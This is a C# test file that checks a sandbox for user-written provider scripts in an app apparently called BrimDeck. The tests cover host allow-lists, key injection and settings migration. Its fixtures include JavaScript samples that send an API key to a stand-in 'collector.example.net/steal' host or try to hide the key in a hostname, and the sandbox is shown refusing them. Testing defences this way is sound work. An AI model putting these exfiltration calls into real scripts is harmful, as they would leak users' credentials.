using System.Net;
using System.Text;
using System.Text.Json;
using BrimDeck.Core;

// W-14: a provider's script may only reach the hosts its row authorizes, and need not hold the API key to use it.
// Every check goes through ConfiguredProviders (the real request path), with a handler standing in for the network.
internal static class ProviderNetworkTests
{
    private const string Key = "sk-fixture-real-key-0123456789";

    public static async Task Run(Action<string, bool> check)
    {
        var secrets = new MemorySecrets();
        using var handler = new Recorder(); using var http = new HttpClient(handler);
        var now = DateTimeOffset.Parse("2026-10-30T12:00:00Z");
        using var providers = new ConfiguredProviders(secrets, http, () => now);
        async Task<ProviderTestResult> Test(AppEntry row) { secrets.Write(row.InstanceId, Key); return await providers.TestAsync(row); }
        static AppEntry Custom(string script, params string[] hosts) { var row = new AppEntry { QuotaSource = ProviderId.Custom, Script = script, AllowedHosts = [.. hosts], SecretRevision = Guid.NewGuid() }; row.Normalize(); return row; }

        // The acceptance case: allowed to reach api.example.com only, the script cannot reach anything else, key or no key.
        var exfil = Custom("""
            async function fetchUsage(ctx) {
              const ok = await ctx.http.get("https://api.example.com/usage", { headers: { Authorization: "Bearer " + ctx.secrets.key } });
              const other = await ctx.http.post("https://collector.example.net/steal", { body: ctx.secrets.key + ok.text() });
              return [{ title: "x", percent: 1 }];
            }
            """, "api.example.com");
        var denied = await Test(exfil);
        check("A script allowed to reach api.example.com only is refused another host, and the request is never sent",
            handler.Hosts.Contains("api.example.com") && !handler.Hosts.Any(h => h.Contains("collector")) && !denied.Snapshot.LiveQuota
            && denied.Snapshot.StatusLabel == ProviderNetwork.DeniedLabel && denied.Snapshot.Status.Contains("collector.example.net"));
        check("The refusal is kept in the test log and in the provider's denial record",
            denied.Logs.Any(l => l.Contains("collector.example.net")) && providers.NetworkDenials.Any(d => d.InstanceId == exfil.InstanceId && d.Host == "collector.example.net"));

        // A script that catches the error and goes on does not hide the refusal.
        handler.Clear();
        var swallowing = Custom("""
            async function fetchUsage(ctx) {
              try { await ctx.http.get("https://collector.example.net/steal?k=" + ctx.secrets.key); } catch (e) { }
              return [{ title: "x", percent: 1 }];
            }
            """, "api.example.com");
        var swallowed = await Test(swallowing);
        check("A refusal the script swallows still shows in the status, and the quota is still read",
            swallowed.Snapshot.LiveQuota && swallowed.Snapshot.Status.Contains("collector.example.net") && handler.Requests.Count == 0);

        // Hosts: exact, wildcard below the domain only, never a look-alike, never an address.
        var wildcard = Custom("function fetchUsage() {}", "*.Example.com", "https://API.Other.test/v1/", "bad host", "*.com", "user@evil.test", "10.0.0.5");
        var policy = ProviderNetwork.For(wildcard);
        check("Host patterns are normalized, and ones that are not hosts or are too wide are dropped",
            wildcard.AllowedHosts!.SequenceEqual(["*.example.com", "api.other.test", "10.0.0.5"]));
        bool Allows(string url) => policy.Allows(new Uri(url));
        check("A wildcard covers names below the domain only; a look-alike, the bare domain and other addresses are refused",
            Allows("https://a.b.example.com/") && Allows("https://api.other.test:8443/x") && Allows("https://10.0.0.5/") && !Allows("https://example.com/")
            && !Allows("https://example.com.evil.test/") && !Allows("https://evilexample.com/") && !Allows("https://10.0.0.6/") && !Allows("https://other.test/"));

        // The key stays out of the script: it holds a placeholder, and the host writes the key into what leaves for an authorized host.
        handler.Clear();
        var injected = Custom("""
            async function fetchUsage(ctx) {
              await ctx.http.post("https://api.example.com/echo?key=" + encodeURIComponent(ctx.secrets.key), { headers: { "X-Api-Key": ctx.secrets.key }, body: "k=" + ctx.secrets.key });
              const echo = await ctx.http.get("https://api.example.com/echo", { headers: { Authorization: "Bearer " + ctx.secrets.key } });
              return [{ title: "holds the key: " + (ctx.secrets.key === "REAL" || ctx.secrets.key.includes("sk-fixture")), percent: 1, note: "echo has key: " + echo.text().includes("sk-fixture") }];
            }
            """.Replace("REAL", Key), "api.example.com");
        var held = await Test(injected);
        var post = handler.Requests[0];
        check("With the key injected, the script does not hold it, and the service still receives it in headers, body and query",
            held.Snapshot.LiveQuota && held.Snapshot.Metrics[0].Label == "holds the key: false" && post.Header("X-Api-Key") == Key && post.Body == "k=" + Key
            && post.Query == "?key=" + Uri.EscapeDataString(Key) && handler.Requests[1].Header("Authorization") == "Bearer " + Key);
        check("A service that echoes the key back does not hand it to the script", held.Snapshot.Metrics[0].Note == "echo has key: false");
        var viaAuth = Custom("""
            async function fetchUsage(ctx) { await ctx.http.get("https://api.example.com/usage", { auth: "bearer" }); await ctx.http.get("https://api.example.com/raw", { auth: "raw", headers: { Authorization: "script-wrote-this" } }); return [{ title: "x", percent: 1 }]; }
            """, "api.example.com");
        handler.Clear(); await Test(viaAuth);
        check("options.auth lets the host write the Authorization header, over whatever the script wrote",
            handler.Requests[0].Header("Authorization") == "Bearer " + Key && handler.Requests[1].Header("Authorization") == Key);
        handler.Clear();
        var inHost = Custom("""
            async function fetchUsage(ctx) { await ctx.http.get("https://" + ctx.secrets.key + ".example.com/x"); return [{ title: "x", percent: 1 }]; }
            """, "*.example.com");
        var hostTry = await Test(inHost);
        check("The key cannot be carried into a host name under a wildcard", handler.Requests.Count == 0 && !hostTry.Snapshot.LiveQuota);

        // Rows saved before hosts were authorized keep working as they were, and are marked for one review.
        handler.Clear();
        var oldJson = $$"""
            {"Apps":[{"QuotaSource":"custom","Site":"https://site.example.org","SecretRevision":"{{Guid.NewGuid()}}",
              "Script":"async function fetchUsage(ctx) { const a = await ctx.http.get(ctx.site + '/u'); const b = await ctx.http.get('https://api.legacy.test/u?k=' + ctx.secrets.key); const h = 'late'; await ctx.http.get('https://' + h + '.dynamic.test/u'); return [{ title: ctx.secrets.key === '{{Key}}' ? 'plain' : 'masked', percent: 1 }]; }"}]}
            """;
        var before = JsonSerializer.Deserialize<DeckSettings>(oldJson)!.Apps.Single();
        string keyBefore = ProviderCatalog.ConfigurationKey(before), requestBefore = ProviderCatalog.RequestKey(before, "k");
        var legacy = SettingsMigrations.Read(oldJson).Apps.Single();
        check("A saved custom row authorizes the hosts its script names, keeps the key as the script has always had it, and awaits one review",
            legacy.AllowedHosts!.SequenceEqual(["api.legacy.test"]) && legacy.SecretAccess == SecretAccess.Script && legacy.NetworkReviewPending
            && ProviderNetwork.ReviewNotice(legacy).Contains("api.legacy.test") && ProviderNetwork.For(legacy).Hosts.Contains("site.example.org"));
        check("Migration leaves the row's keys as they were, so nothing is read again or alerted twice because of it",
            ProviderCatalog.ConfigurationKey(legacy) == keyBefore && ProviderCatalog.RequestKey(legacy, "k") == requestBefore && ProviderCatalog.ConfigurationKey(before) == keyBefore);
        var migrated = await Test(legacy);
        check("The migrated row reads its site and the named host as before; a host the script builds at run time is refused, visibly",
            handler.Hosts.Contains("site.example.org") && handler.Hosts.Contains("api.legacy.test") && !handler.Hosts.Any(h => h.Contains("dynamic"))
            && migrated.Snapshot.StatusLabel == ProviderNetwork.DeniedLabel && migrated.Snapshot.Status.Contains("late.dynamic.test"));
        var settingsRound = JsonSerializer.Deserialize<DeckSettings>(JsonSerializer.Serialize(new DeckSettings { Apps = [legacy] }))!.Apps.Single();
        settingsRound.Normalize();
        var confirmed = settingsRound.Copy(); confirmed.AllowedHosts!.Add("late.dynamic.test"); confirmed.NetworkReviewPending = false;
        check("The authorization is saved with the row, copied with it, and changed rows are read apart",
            settingsRound.AllowedHosts!.SequenceEqual(legacy.AllowedHosts!) && settingsRound.NetworkReviewPending && legacy.Copy().AllowedHosts != legacy.AllowedHosts
            && confirmed.ConfigurationKey != legacy.ConfigurationKey && confirmed.ConfigurationKey.Contains(":net") && ProviderNetwork.ReviewNotice(confirmed) == "");
        var asBefore = SettingsMigrations.Read(oldJson).Apps.Single(); asBefore.Normalize();
        check("Normalizing again changes nothing", asBefore.AllowedHosts!.SequenceEqual(legacy.AllowedHosts!) && asBefore.SecretAccess == SecretAccess.Script);

        // New rows start closed and injected; rows with their own script are bound to fixed hosts.
        var fresh = new AppEntry { QuotaSource = ProviderId.Custom }; fresh.Normalize();
        check("A new custom row starts with no hosts, the key injected and no review pending",
            fresh.AllowedHosts is { Count: 0 } && fresh.SecretAccess == SecretAccess.Injected && !fresh.NetworkReviewPending && ProviderNetwork.For(fresh).Hosts.Count == 0);
        var bound = new AppEntry { QuotaSource = ProviderId.DeepSeek, AllowedHosts = ["evil.test"] };
        var boundPolicy = ProviderNetwork.For(bound);
        var gateway = new AppEntry { QuotaSource = ProviderId.NewApi, Site = "https://gw.example.test/deploy", AllowedHosts = ["evil.test"] };
        check("Built-in providers keep a fixed policy that AllowedHosts cannot widen",
            boundPolicy.Hosts.SequenceEqual(["api.deepseek.com"]) && !boundPolicy.Allows(new Uri("https://evil.test/")) && boundPolicy.Secret == SecretAccess.Injected
            && ProviderNetwork.For(gateway).Hosts.SequenceEqual(["gw.example.test"])
            && ProviderNetwork.FixedHosts(ProviderId.KimiApi).SequenceEqual(["api.kimi.com", "api.kimi.ai"]) && ProviderNetwork.FixedHosts(ProviderId.OpenCodeGo).SequenceEqual(["opencode.ai"]));
        // The shipped scripts name no host outside their fixed policy.
        var shipped = new (ProviderId Id, string Script)[] { (ProviderId.GlmChina, ProviderScripts.GlmChina), (ProviderId.GlmGlobal, ProviderScripts.GlmGlobal), (ProviderId.DeepSeek, ProviderScripts.DeepSeek), (ProviderId.OpenRouter, ProviderScripts.OpenRouter) };
        check("Every host a built-in script names is in that provider's fixed policy",
            shipped.All(s => ProviderNetwork.LiteralHosts(s.Script).Count > 0 && ProviderNetwork.LiteralHosts(s.Script).All(h => ProviderNetwork.FixedHosts(s.Id).Contains(h))));
        handler.Clear();
        var deepSeek = new AppEntry { QuotaSource = ProviderId.DeepSeek, SecretRevision = Guid.NewGuid() };
        handler.Respond = _ => new HttpResponseMessage(HttpStatusCode.OK) { Content = new StringContent("""{"is_available":true,"balance_infos":[{"currency":"USD","total_balance":"5.00","granted_balance":"1.00","topped_up_balance":"4.00"}]}""") };
        var live = await Test(deepSeek);
        check("A built-in script sends its key, injected, to its own host", live.Snapshot.LiveQuota && handler.Requests.Single().Host == "api.deepseek.com" && handler.Requests.Single().Header("Authorization") == "Bearer " + Key);
    }

    private sealed record Seen(string Host, string Query, string Body, Dictionary<string, string> Headers)
    {
        public string? Header(string name) => Headers.GetValueOrDefault(name.ToLowerInvariant());
    }
    private sealed class Recorder : HttpMessageHandler
    {
        public List<Seen> Requests { get; } = [];
        public IEnumerable<string> Hosts => Requests.Select(r => r.Host);
        public Func<HttpRequestMessage, HttpResponseMessage>? Respond { get; set; }
        public void Clear() { Requests.Clear(); Respond = null; }
        protected override async Task<HttpResponseMessage> SendAsync(HttpRequestMessage request, CancellationToken cancellationToken)
        {
            var headers = request.Headers.ToDictionary(h => h.Key.ToLowerInvariant(), h => string.Join(", ", h.Value));
            if (request.Content is not null) foreach (var h in request.Content.Headers) headers[h.Key.ToLowerInvariant()] = string.Join(", ", h.Value);
            var body = request.Content is null ? "" : await request.Content.ReadAsStringAsync(cancellationToken);
            Requests.Add(new(request.RequestUri!.Host, request.RequestUri.Query, body, headers));
            if (Respond is { } respond) return respond(request);
            // Answers a request by repeating what it carried, as a service that echoes credentials back would.
            var echo = string.Join(" ", headers.Select(h => h.Key + "=" + h.Value)) + " " + body + " " + request.RequestUri.Query;
            return new HttpResponseMessage(HttpStatusCode.OK) { Content = new StringContent(echo, Encoding.UTF8) };
        }
    }
    private sealed class MemorySecrets : IProviderSecrets
    {
        private readonly Dictionary<Guid, string> _keys = [];
        public string Read(Guid id) => _keys.GetValueOrDefault(id, "");
        public void Write(Guid id, string key) => _keys[id] = key;
        public void Delete(Guid id) => _keys.Remove(id);
    }
}
